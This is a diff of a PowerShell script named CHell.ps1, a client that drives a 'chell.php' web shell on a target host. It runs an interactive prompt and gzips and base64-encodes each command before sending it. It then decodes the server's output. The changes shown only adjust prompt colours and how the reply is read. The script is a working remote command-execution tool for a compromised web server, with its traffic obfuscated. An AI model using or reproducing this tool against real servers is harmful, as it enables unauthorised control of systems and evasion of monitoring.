@@ -1,9 +1,10 @@
-﻿if ($args.Count -ne 1) {
+if ($args.Count -ne 1) {
     Write-Host "CHell.ps1 http://target/chell.php"
 } else {
-    Write-host "Press <CTRL+C> to exit."
+    Write-host "Press <CTRL+C> to exit." -ForegroundColor Red
     while ($true) {
-        $cmd = Read-Host "CHELL "
+        Write-Host "CHELL>" -ForegroundColor Green -NoNewline
+        $cmd = Read-Host 
         $b64 = $cmd |foreach-object {
             $ms = New-Object System.IO.MemoryStream
             $cs = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Compress)
@@ -30,10 +31,8 @@
                 $ms.Seek(0,0) | Out-Null
                 $cs = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress)
                 $sr = New-Object System.IO.StreamReader($cs)
-                while (($curline = $sr.ReadLine()) -ne $null) {
-                    Write-Host $curline
-                }
-                
+                $curline = $sr.ReadToEnd()
+                Write-Host $curline  
             }
         }
         write-host    
